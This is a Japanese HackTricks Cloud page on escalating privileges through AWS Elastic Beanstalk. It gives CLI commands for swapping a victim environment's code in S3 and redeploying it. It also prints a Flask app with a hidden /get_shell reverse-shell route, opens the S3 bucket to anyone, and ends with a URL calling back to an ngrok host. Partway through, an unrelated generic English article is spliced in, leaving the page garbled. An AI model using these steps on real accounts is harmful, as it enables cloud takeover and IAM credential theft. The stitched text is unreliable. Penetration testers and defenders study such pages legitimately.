# AWS - Elastic Beanstalk 特権エスカレーション

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## Elastic Beanstalk

**Elastic Beanstalkに関する詳細情報**は以下を参照してください：

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Beanstalkで機密操作を実行するには、**さまざまなサービスで多くの機密権限**が必要です。例えば、**`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`**に与えられる権限を確認できます。
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`、S3書き込み権限など

**環境のコードを含むS3バケットに書き込み権限**と、アプリケーションを**再構築**するための権限（`elasticbeanstalk:RebuildEnvironment`および`S3`、`EC2`、`Cloudformation`に関連する他の権限が必要です）を持っている場合、**コードを変更**し、アプリを再構築することができます。次回アプリにアクセスすると、新しいコードが実行され、攻撃者はアプリケーションとそれに関連するIAMロールの資格情報を危険にさらすことができます。

{% code overflow="wrap" %}
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`,  `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`など...

上記の権限に加えて、**`S3`**、**`EC2`**、**`cloudformation`**、**`autoscaling`**、**`elasticloadbalancing`**の権限が必要です。これらの権限を持つことで、Elastic Beanstalkのシナリオをゼロから作成することができます。

* AWS Elastic Beanstalkアプリケーションの作成：
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* AWS Elastic Beanstalk環境を作成します（[**サポートされているプラットフォーム**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)）：

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

環境が既に作成されており、新しい環境を作成したくない場合は、既存の環境を単に更新することができます。

* アプリケーションコードと依存関係をZIPファイルにパッケージ化します：
```python
zip -r MyApp.zip .
```
* S3バケットにZIPファイルをアップロードします：
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* AWS Elastic Beanstalkアプリケーションバージョンの作成:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* AWS Elastic Beanstalk環境にアプリケーションバージョンをデプロイします：

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

まず、**前の手順**に従って、**被害者**で実行したい**コード**を含む**正規のBeanstalk環境**を作成する必要があります。おそらく、これらの**2つのファイル**を含む単純な**zip**ファイルです。

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

自分のBeanstalk環境でrev shellを実行している場合、それを被害者の環境に移行する時が来ました。そのためには、BeanstalkのS3バケットのBucket Policyを更新して、被害者がアクセスできるようにする必要があります（注意：これによりバケットは「誰でも」アクセスできるようになります）。
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# AWS Elastic Beanstalk Privilege Escalation

## Introduction

AWS Elastic Beanstalk is a fully managed service that makes it easy to deploy and run applications in multiple languages. However, misconfigurations in Elastic Beanstalk environments can lead to privilege escalation vulnerabilities.

## Exploiting Privilege Escalation Vulnerabilities

### 1. Environment Variables

#### Description

Environment variables in Elastic Beanstalk can be used to store sensitive information such as API keys, database credentials, and other secrets. If these variables are not properly protected, an attacker can escalate their privileges by accessing and abusing them.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for environment variables that may contain sensitive information.
4. If any environment variables are found, attempt to access and abuse them to escalate privileges.

### 2. IAM Roles and Policies

#### Description

IAM roles and policies in Elastic Beanstalk define the permissions and access controls for the environment and its associated resources. Misconfigurations in these roles and policies can allow an attacker to escalate their privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for IAM roles and policies that may have excessive permissions or misconfigurations.
4. If any misconfigurations are found, attempt to exploit them to escalate privileges.

### 3. Instance Profiles

#### Description

Instance profiles in Elastic Beanstalk define the IAM role that is associated with the EC2 instances running in the environment. If an instance profile has excessive permissions or misconfigurations, an attacker can escalate their privileges.

#### Exploitation

1. Identify the Elastic Beanstalk environment and its associated application.
2. Use the AWS Management Console or AWS CLI to access the environment's configuration.
3. Look for instance profiles that may have excessive permissions or misconfigurations.
4. If any misconfigurations are found, attempt to exploit them to escalate privileges.

## Conclusion

Privilege escalation vulnerabilities in AWS Elastic Beanstalk can be exploited by attackers to gain unauthorized access and control over the environment and its resources. It is important to regularly review and secure the configuration of Elastic Beanstalk environments to mitigate these risks.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **会社をハックトリックで宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆ハックトリックのグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
